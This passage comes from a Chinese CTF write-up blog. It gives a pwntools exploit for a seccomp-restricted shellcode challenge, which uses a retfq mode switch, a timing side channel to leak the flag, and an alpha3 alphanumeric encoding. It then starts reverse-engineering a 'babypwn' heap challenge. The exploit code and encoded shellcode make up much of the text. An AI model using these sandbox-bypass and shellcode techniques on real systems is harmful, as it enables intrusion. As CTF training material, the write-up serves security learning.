0x39</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string">   push 0x20</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /* 利用无借位减法算出0xcb */</span></span><br><span class="line"><span class="string">   push 0x47</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">   sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">   push rdi</span></span><br><span class="line"><span class="string">   push rdi</span></span><br><span class="line"><span class="string">   push 0x23</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_open = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* open函数 */</span></span><br><span class="line"><span class="string">   mov esp, 0x40404550</span></span><br><span class="line"><span class="string">   push 0x67616c66/* flag */</span></span><br><span class="line"><span class="string">   mov ebx, esp</span></span><br><span class="line"><span class="string">   xor ecx, ecx</span></span><br><span class="line"><span class="string">   xor edx, edx</span></span><br><span class="line"><span class="string">   mov eax, 0x5</span></span><br><span class="line"><span class="string">   int 0x80</span></span><br><span class="line"><span class="string">   mov ecx, eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq_back = asm(<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">   /* retfq */</span></span><br><span class="line"><span class="string">   push 0x33</span></span><br><span class="line"><span class="string">   push 0x40404064 /* 具体数字有待修改 */</span></span><br><span class="line"><span class="string">   retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_read_flag = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">   mov rdi,rcx</span></span><br><span class="line"><span class="string">   mov rsi,rsp</span></span><br><span class="line"><span class="string">   mov rdx,0x70</span></span><br><span class="line"><span class="string">   xor rax,rax</span></span><br><span class="line"><span class="string">   syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">sh, index, ch</span>):</span></span><br><span class="line">   shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   shellcode += code_mmap</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   shellcode += code_read</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   shellcode += code_retfq</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">   shellcode2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   shellcode2 += code_open</span><br><span class="line">   shellcode2 += code_append</span><br><span class="line">   shellcode2 += code_retfq_back</span><br><span class="line">   shellcode2 += shellcode_read_flag</span><br><span class="line">   <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">      shellcode2 += asm(<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch), arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      shellcode2 += asm(<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch), arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">   sh.sendline(shellcode2)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="comment"># sh = remote(&#x27;39.105.137.118&#x27;, 50050)</span></span><br><span class="line">        sh = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">        pwn(sh, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span>:</span><br><span class="line">            t.append(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br></pre></td></tr></table></figure><ul><li>这道题我后来想再切到32位进行<code>write</code>调用，后来发现是我看错了=-=。这里当调用号为4的时候，返回的是kill，所以我怎么样都没有办法获得输出：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br></pre></td></tr></table></figure><ul><li><p>不过呢，经过调试也是有一定的收获的：</p><ul><li>遇到不能执行的系统调用，gdb会返回：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Program terminated with signal SIGSYS, Bad system call.</span><br><span class="line">The program no longer exists.</span><br></pre></td></tr></table></figure><ul><li>在调试的过程中，切到32位但是gdb并不会显示正确，如下所示32位架构下，eax为4，系统调用应该为<code>SYS_write</code>，但是gdb还是显示的是<code>SYS_stat</code>，可能这和gdb的版本有关系吧。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x4040407f    mov    ebx, 1</span><br><span class="line">0x40404084    mov    ecx, 0x4040454c</span><br><span class="line">0x40404089    mov    edx, 0x20</span><br><span class="line">0x4040408e    mov    eax, 4</span><br><span class="line">0x40404093    int    0x80 &lt;SYS_stat&gt;</span><br><span class="line">     file: 0x3</span><br><span class="line">     buf: 0x4040454c ◂— insb   byte ptr [rdi], dx /* 0x3332317b67616c66; &#x27;flag&#123;123456&#125;\n&#x27; */</span><br></pre></td></tr></table></figure><ul><li>补充<code>retfq</code>切换到32位和<code>write</code>调用的shellcode：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">code_retfq2 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* retfq */</span></span><br><span class="line"><span class="string">   push 0x23</span></span><br><span class="line"><span class="string">   push 0x4040407f</span></span><br><span class="line"><span class="string">   retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code_retfq2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># code_write = asm(shellcraft.write(1, 0x4040454c, 100), arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line">code_write = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* write */</span></span><br><span class="line"><span class="string">   mov ebx, 1 /* 文件描述符 */</span></span><br><span class="line"><span class="string">   mov ecx, 0x4040454c /* flag地址 */</span></span><br><span class="line"><span class="string">   mov edx, 0x20 /* 打印的数据长度 */</span></span><br><span class="line"><span class="string">   mov eax, 0x4 /* 系统调用号 */</span></span><br><span class="line"><span class="string">   int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h4><ul><li>我们也可以用alpha3项目来完成第一步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><ul><li>首先生成shellcode：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">sc</span>):</span></span><br><span class="line"><span class="keyword">return</span> asm(sc, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, 0x40404040;</span></span><br><span class="line"><span class="string">pushw 0x1010;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9</span></span><br><span class="line">code_mmap = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 0x40404040;</span></span><br><span class="line"><span class="string">push 0x7f;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">push 7;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">push 34;</span></span><br><span class="line"><span class="string">pop rcx;</span></span><br><span class="line"><span class="string">xor r8, r8;</span></span><br><span class="line"><span class="string">xor r9, r9;</span></span><br><span class="line"><span class="string">push 9;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_rsp = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp, 0x40404f40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x23;</span></span><br><span class="line"><span class="string">push 0x40404040;</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = code_mmap + code_read + code_rsp + code_retfq</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(shellcode)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure><ul><li>然后使用alpha3生成可见字符（为什么是rbx呢，因为shellcode调用指令是<code>call rbx</code>）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ALPHA3.py x64 ascii mixedcase rbx --input=&#x27;/home/secc/Desktop/sc&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00</span><br></pre></td></tr></table></figure><ul><li>这样我们第一次发送的payload就可以替换成以上字符串了。</li></ul><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><ul><li>查看沙盒：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./babypwn </span><br><span class="line">1.add</span><br><span class="line">2.delete</span><br><span class="line">3.edit</span><br><span class="line">4.show</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>打开IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_C54(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">      v3 = sub_BEF();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_DD9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_EE3();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_103A();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_CDB();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>add函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span> &amp;&amp; (*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * i) || qword_202068[<span class="number">2</span> * i]); ++i )<span class="comment">// 限制只能同时申请16个堆</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">  size = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * i) = <span class="built_in">malloc</span>(size);<span class="comment">// 申请大小</span></span><br><span class="line">  qword_202068[<span class="number">2</span> * i] = size;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>edit函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_EE3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v1), qword_202068[<span class="number">2</span> * v1]);<span class="comment">// 读入时没有截断，可能存在地址泄露</span></span><br><span class="line">  sub_EB1(*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1));<span class="comment">// 这里就是检测函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_EB1</code>检测函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_EB1</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)*a1;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x11</span> )<span class="comment">// 遇到0x11的时候，停止并将该字符替换为0</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> __int64)a1;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_103A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_FCC(**((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)&amp;unk_202060 + <span class="number">2</span> * v1));</span><br><span class="line">  sub_FCC(*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) + <span class="number">4LL</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_FCC</code>函数，输出的时候会对内容进行异或操作：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_FCC</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">    a1 ^= (<span class="number">32</span> * a1) ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br></pre></td></tr></table></figure><ul><li>free函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_DD9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> || !*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) || !qword_202068[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v1));</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">  qword_202068[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span 